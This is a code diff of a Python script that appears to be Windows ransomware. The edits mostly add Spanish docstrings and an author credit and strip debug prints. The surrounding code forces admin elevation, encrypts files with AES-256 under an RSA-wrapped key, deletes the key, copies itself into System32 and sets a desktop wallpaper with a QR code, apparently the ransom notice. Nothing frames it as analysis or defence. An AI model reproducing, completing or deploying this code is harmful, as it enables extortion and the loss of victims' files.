@@ -9,7 +9,7 @@ import io
 import ctypes
 import sys
 
-
+__author__ = "Reyes Ramos Luz María, Dragoncode"
 # Trata de escalar permisos, pide al usuario ejecutar como administrador
 if not ctypes.windll.shell32.IsUserAnAdmin():
     # Si no se tienen permisos de administrador, volver a ejecutar con elevación de privilegios
@@ -20,6 +20,16 @@ if not ctypes.windll.shell32.IsUserAnAdmin():
 
 # Función para cifrar un archivo usando AES-256
 def encrypt_aes(file_path, key):
+    """
+    Encripta un archivo usando cifrado AES-256.
+
+    Args:
+        ruta_archivo (str): La ruta del archivo a encriptar.
+        clave (bytes): La clave de encriptación AES.
+
+    Returns:
+        None
+    """
     cipher = AES.new(key, AES.MODE_EAX)
     with open(file_path, 'rb') as f:
         plaintext = f.read()
@@ -65,8 +75,7 @@ enc_key = cipher_rsa.encrypt(key)
 with open('encrypted_key.bin', 'wb') as f:
     f.write(enc_key)
 
-#print("Clave generada:", rsa_key)
-#print("Clave AES cifrada con RSA:", enc_key)
+
 
 
 # Crear un directorio en system32
@@ -99,7 +108,7 @@ del key
 
 # Copiar el ejecutable al directorio system32
 
-print('DESPUES DE ENCRIPTAR')
+
 # Nombre del ejecutable actual
 executable_name = os.path.basename(sys.argv[0])
 
@@ -111,12 +120,12 @@ destination_path = os.path.join(system32_path, executable_name)
 
 # Copiar el ejecutable a system32 
 shutil.copyfile(current_executable_path, destination_path)
-print('DESPUES DE COPIAR SY32')
+
 
 
 # Leer la representación hexadecimal de la imagen desde el archivo de texto
 
-print('LEE IMAGEN')
+
 script_directory = os.path.dirname(os.path.abspath(__file__))
 txt_file_path = os.path.join(script_directory, 'image_data.txt')
 with open(txt_file_path, 'r') as txt_file:
@@ -125,18 +134,36 @@ with open(txt_file_path, 'r') as txt_file:
 # Convertir la representación hexadecimal a una imagen
 
 def hex_to_image(hex_data):
+    """
+    Convierte datos hexadecimales en una imagen.
+
+    Args:
+        hex_data (str): Representación hexadecimal de los datos de la imagen.
+
+    Returns:
+        PIL.Image.Image: El objeto de imagen.
+    """
     image_data = bytes.fromhex(hex_data)
     return Image.open(io.BytesIO(image_data))
 
 
 def set_wallpaper(image_path):
+    """
+    Establece el fondo de escritorio.
+
+    Args:
+        ruta_imagen (str): Ruta del archivo de imagen.
+
+    Returns:
+        None
+    """
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
 
 
 
 # Guardar la imagen en el escritorio
-print('GUARDA EN ESCRITORIO')
+
 desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
 image_path = os.path.join(desktop_path, 'IMPORTANTE.jpg')
 image = hex_to_image(hex_data)
@@ -149,14 +176,8 @@ new_height = 600  # Cambia la altura según lo desees
 image = image.resize((new_width, new_height))
 image.save(image_path)
 
-print('CAMBIA FONDO')
+
 set_wallpaper(image_path)
 
 print("\n\tIF YOU DONT GET TO SEE THE QR CODE, ADJUST YOUR DESKTOP WALLPAPER to 'ADJUST'!")
 
-"""
-# Mostrar la imagen abre un  visor de imagenes
-image = hex_to_image(hex_data)
-image.show()
-
-"""
